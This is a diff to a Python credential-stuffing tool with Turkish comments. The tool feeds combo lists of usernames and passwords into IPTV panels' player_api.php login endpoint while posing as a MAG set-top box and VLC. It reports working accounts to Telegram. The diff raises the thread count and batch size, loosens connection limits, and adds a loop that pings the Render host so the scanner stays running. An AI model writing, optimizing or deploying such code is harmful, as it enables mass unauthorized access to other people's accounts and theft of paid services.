@@ -34,17 +34,29 @@ HEADERd = {
     'Cookie': 'stb_lang=pt; timezone=America%2FNew_York;',
     'X-User-Agent': 'Model: MAG322; Link: Ethernet,WiFi',
     'Accept': '*/*',
-    'Connection': 'close',  # Soketlerin TIME_WAIT'te yığılmasını önlemek için bağlantıyı hemen kapatıyoruz
+    'Connection': 'Keep-Alive',
     'Accept-Encoding': 'gzip',
     'User-Agent': 'VLC/3.0.18 LibVLC/3.0.18',
 }
 
 BASE_DIR = os.path.dirname(os.path.abspath(__file__))
 
+def render_uynik_tutucu():
+    time.sleep(10)
+    app_url = os.environ.get('RENDER_EXTERNAL_URL')
+    if app_url:
+        print(f"[*] Keep-Alive aktif: {app_url}")
+        while True:
+            try:
+                requests.get(app_url, timeout=10)
+            except:
+                pass
+            time.sleep(300)
+
 def m3u_tara_detayli(session, panel, user, pas):
     api_url = f"http://{panel}/player_api.php?username={user}&password={pas}"
     try:
-        res = session.get(api_url, headers=HEADERd, timeout=(2, 3), verify=False)
+        res = session.get(api_url, headers=HEADERd, timeout=(3, 4), verify=False)
         if res.status_code == 200 and 'user_info' in res.text:
             veri = str(res.text)
             if '"auth":1' in veri or '"status":"Active"' in veri:
@@ -100,9 +112,9 @@ def m3u_tara_detayli(session, panel, user, pas):
     return False
 
 def arka_plan_tarayici():
-    print("[*] Windows Soket Korumalı Yerel Tarayıcı Başlatıldı...")
+    print("[*] Bellek Dostu Akış Tarayıcısı Başlatıldı...")
     time.sleep(2)
-    telegrama_gonder("🚀 <b>Lokal Tarayıcı Aktif (Port Koruma Modu)!</b>")
+    telegrama_gonder("🚀 <b>Hızlı Tarayıcı Aktif (OOM Korumalı)!</b>")
     
     combo_dir = os.path.join(BASE_DIR, 'combo')
     panel_dir = os.path.join(BASE_DIR, 'panel_list')
@@ -125,12 +137,11 @@ def arka_plan_tarayici():
                         dosya_yolu = os.path.join(combo_dir, dosya_adi)
                         print(f"\n[i] Taranıyor: {dosya_adi}")
                         
-                        batch_size = 300  # Paket boyutunu küçülttük ki Windows portları rahat nefes alsın
+                        batch_size = 500  # Hafızayı şişirmemek için 500'lük paketler halinde işleyeceğiz
                         chunk = []
                         
                         with requests.Session() as session:
-                            # Havuz limitlerini Windows'a göre optimize ettik
-                            adapter = HTTPAdapter(pool_connections=10, pool_maxsize=10, max_retries=0)
+                            adapter = HTTPAdapter(pool_connections=30, pool_maxsize=30, max_retries=1)
                             session.mount('http://', adapter)
                             session.mount('https://', adapter)
                             
@@ -143,8 +154,9 @@ def arka_plan_tarayici():
                                         if u and p:
                                             chunk.append((u, p))
                                     
+                                    # Paket dolunca hemen tara ve RAM'i boşalt
                                     if len(chunk) >= batch_size:
-                                        with ThreadPoolExecutor(max_workers=10) as executor: # İş parçacığını 10'a sabitledik (Windows stabil çalışması için)
+                                        with ThreadPoolExecutor(max_workers=15) as executor:
                                             futures = [
                                                 executor.submit(m3u_tara_detayli, session, panel, user, pas)
                                                 for user, pas in chunk
@@ -154,10 +166,10 @@ def arka_plan_tarayici():
                                                 pass
                                         chunk.clear()
                                         gc.collect()
-                                        time.sleep(0.2) # Windows soketlerinin kapanması için minik bir mola
 
+                                # Dosya sonunda kalan son küçük paketi tara
                                 if chunk:
-                                    with ThreadPoolExecutor(max_workers=10) as executor:
+                                    with ThreadPoolExecutor(max_workers=15) as executor:
                                         futures = [
                                             executor.submit(m3u_tara_detayli, session, panel, user, pas)
                                             for user, pas in chunk
@@ -180,6 +192,10 @@ if __name__ == '__main__':
     t1 = threading.Thread(target=arka_plan_tarayici)
     t1.daemon = True
     t1.start()
+    
+    t2 = threading.Thread(target=render_uynik_tutucu)
+    t2.daemon = True
+    t2.start()
     
     print("[*] Flask Web Sunucusu Başlatılıyor...")
     app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8080)))
